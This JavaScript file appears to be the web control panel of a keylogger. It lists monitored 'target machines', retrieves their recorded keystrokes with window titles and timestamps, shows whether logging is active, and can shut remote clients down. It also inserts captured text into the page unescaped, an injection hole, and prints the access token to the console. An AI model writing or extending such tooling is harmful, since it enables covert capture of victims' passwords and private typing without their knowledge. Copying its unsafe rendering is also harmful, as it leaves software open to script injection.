function BackToLogin() {
    window.location.href = "/login";
}

function handleTokenError(errorMsg) {
    console.error("Token error:", errorMsg);
    document.cookie = "access_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
    BackToLogin();
}

async function getCookie(name) {
    const cookies = document.cookie.split('; ').map(cookie => cookie.split('='));
    for (let [key, value] of cookies) {
        if (key === name) {
            return decodeURIComponent(value);
        }
    }
    return null;
}

async function GetDemoLogs() {
    const token = await getCookie("access_token");
    console.log(token);
    
    if (!token) {
        handleTokenError("No token found");
        return;
    }

    try {
        let response = await fetch("/api/get_demo", {
            method: "GET",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });

        if (!response.ok) {
            handleTokenError(`HTTP error! Status: ${response.status}`);
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        
        let data = await response.json();
        if (data.msg === "Token has expired") {
            handleTokenError("Token has expired");
            return;
        }
        
        return data;
    } catch (error) {
        console.error("Error fetching demo logs:", error);
        return null;
    }
}

async function GetComputersList() {
    const token = await getCookie("access_token"); 
    if (!token) {
        handleTokenError("No token found");
        return;
    }

    try {
        let response = await fetch("/api/get_target_machines_list", {
            method: "GET",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });

        if (!response.ok) {
            handleTokenError(`HTTP error! Status: ${response.status}`);
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        
        let data = await response.json();
        if (data.msg === "Token has expired") {
            handleTokenError("Token has expired");
            return;
        }
        return data;
    } catch (error) {
        console.error("Error fetching computers list:", error);
        return null;
    }
}

async function GetComputersActivity(machine_sn, start_date, end_date) {
    const token = await getCookie("access_token"); 
    if (!token) {
        handleTokenError("No token found");
        return;
    }
    
    try {
        let response = await fetch("/api/get_keystrokes?machine_sn=" + machine_sn + "&start_date=" + start_date + "&end_date=" + end_date, {
            method: "GET",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });
        
        if (!response.ok) {
            handleTokenError(`HTTP error! Status: ${response.status}`);
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        
        let data = await response.json();
        if (data.msg === "Token has expired") {
            handleTokenError("Token has expired");
            return;
        }
        
        return data;
    } catch (error) {
        console.error("Error fetching computer activity:", error);
        return null;
    }
}

async function StopListening(machineId) {
    const token = await getCookie("access_token");
    if (!token) {
        handleTokenError("No token found");
        return;
    }

    try {
        let response = await fetch(`/api/shutdown_client?machine_sn=${machineId}`, {
            method: "POST",
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });

        if (!response.ok) {
            handleTokenError(`HTTP error! Status: ${response.status}`);
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        let data = await response.json();
        if (data.msg === "Token has expired") {
            handleTokenError("Token has expired");
            return;
        }

        if (data.status === "success") {
            let indicator = document.getElementById("indicator");
    
            indicator.classList.remove("active");
            indicator.title = "Logging is not active."
    
            fetchLogs();
        }

        return data;
    } catch (error) {
        console.error("Error stopping listener:", error);
        return null;
    }
}

async function fetchLogs() {
    const table = document.getElementById("ComputersTableBody");
    table.innerHTML = "<tr><td colspan='4' class='text-center'>Loading data...</td></tr>";

    try {
        const data = await GetComputersList();
        table.innerHTML = "";

        if (!data || typeof data !== "object" || Object.keys(data).length === 0) { 
            table.innerHTML = "<tr><td colspan='4' class='text-center'>No available data</td></tr>";
            return;
        }

        Object.entries(data).forEach(([id, details]) => {
            const row = document.createElement("tr");
            row.innerHTML = `
                <td>${id}</td>
                <td>${details.ip}</td>
                <td>${details.name}</td>
                <td>${details.active ? '✅' : '🟩'}</td>
            `;
            table.appendChild(row);
        });
    } catch (error) {
        console.error("Error in fetchLogs:", error);
        table.innerHTML = "<tr><td colspan='4' class='text-center'>Error loading data</td></tr>";
    }
}

function formatDateToDDMMYYYY(dateStr) {
    let date = new Date(dateStr);
    let day = String(date.getDate()).padStart(2, '0');
    let month = String(date.getMonth() + 1).padStart(2, '0');
    let year = date.getFullYear();
    return `${day}-${month}-${year}`;
}

async function LoadComputerActivity(machine_sn, start_date, end_date) {
    const table = document.getElementById("ActivityTable");
    table.innerHTML = "<tr><td colspan='3' class='text-center'>Loading data...</td></tr>";
    try {
        const log = await GetComputersActivity(machine_sn, start_date, end_date);
        table.innerHTML = "";
        
        if (!log) {
            table.innerHTML = "<tr><td colspan='3' class='text-center'>No available data</td></tr>";
            return;
        }
        
        if (log.error) {
            table.innerHTML = `<tr><td colspan='3' class='text-center'>${log.error}</td></tr>`;
            return;
        }
        
        if (typeof log !== "object" || Object.keys(log).length === 0 || !log.logs) {
            table.innerHTML = "<tr><td colspan='3' class='text-center'>No available data</td></tr>";
        } else {
            Object.entries(log.logs).forEach(([window, val]) => {
                Object.entries(val).forEach(([time, text]) => {
                    const row = document.createElement("tr");
                    row.innerHTML = `<td>${time}</td><td>${window}</td><td>${text}</td>`;
                    table.appendChild(row);
                });
            });  
        }
    } catch (error) {
        console.error("Error in LoadComputerActivity:", error);
        table.innerHTML = "<tr><td colspan='3' class='text-center'>Error loading data</td></tr>";
    }
}

const popup = document.getElementById("ComputerActivity");
const overlay = document.getElementById("overlay");
const closePopupBtn = document.getElementById("closePopup");

function closePopup() {
    popup.style.display = "none";
    overlay.style.display = "none";

    const stopListeningButton = document.getElementById("stopListening");
    if (stopListeningButton) {
        stopListeningButton.replaceWith(stopListeningButton.cloneNode(true));
    }
}

async function openPopup(machineId, ip, name, active) {
    document.getElementById("compId").textContent = machineId;
    document.getElementById("compIp").textContent = ip;
    document.getElementById("compName").textContent = name;

    let indicator = document.getElementById("indicator");
    if (active === '✅') {
        indicator.classList.add("active");
        indicator.title = "Logging is active.";
    } else {
        indicator.classList.remove("active");
        indicator.title = "Logging is not active.";
    }

    popup.style.display = "block";
    overlay.style.display = "block";

    let today = new Date().toISOString().split('T')[0];
    document.getElementById("startDate").value = today;
    document.getElementById("endDate").value = today;

    LoadComputerActivity(machineId, formatDateToDDMMYYYY(today), formatDateToDDMMYYYY(today));

    const stopListeningButton = document.getElementById("stopListening");
    stopListeningButton.replaceWith(stopListeningButton.cloneNode(true));

    document.getElementById("stopListening").addEventListener("click", function() {
        const currentMachineId = document.getElementById("compId").textContent;
        StopListening(currentMachineId);
    });
}

document.addEventListener("DOMContentLoaded", function() {
    fetchLogs();
    
    closePopupBtn.addEventListener("click", closePopup);
    overlay.addEventListener("click", closePopup);
    
    document.addEventListener("keydown", function(event) {
        if (event.key === "Escape") {
            closePopup();
        }
    });
    
    document.getElementById("logout").addEventListener("click", async function() {
        document.cookie = "access_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        BackToLogin();
    });
    
    const tableBody = document.getElementById("ComputersTableBody");
    tableBody.addEventListener("click", function(event) {
        let row = event.target.closest("tr");
        if (!row) return;

        let rowData = Array.from(row.children).map(td => td.textContent.trim());
        openPopup(rowData[0], rowData[1], rowData[2], rowData[3]);
    });
    
    document.getElementById("updateActivity").addEventListener("click", function() {
        let machineId = document.getElementById("compId").textContent;
        let startDate = document.getElementById("startDate").value;
        let endDate = document.getElementById("endDate").value;

        LoadComputerActivity(machineId, formatDateToDDMMYYYY(startDate), formatDateToDDMMYYYY(endDate));
    });
});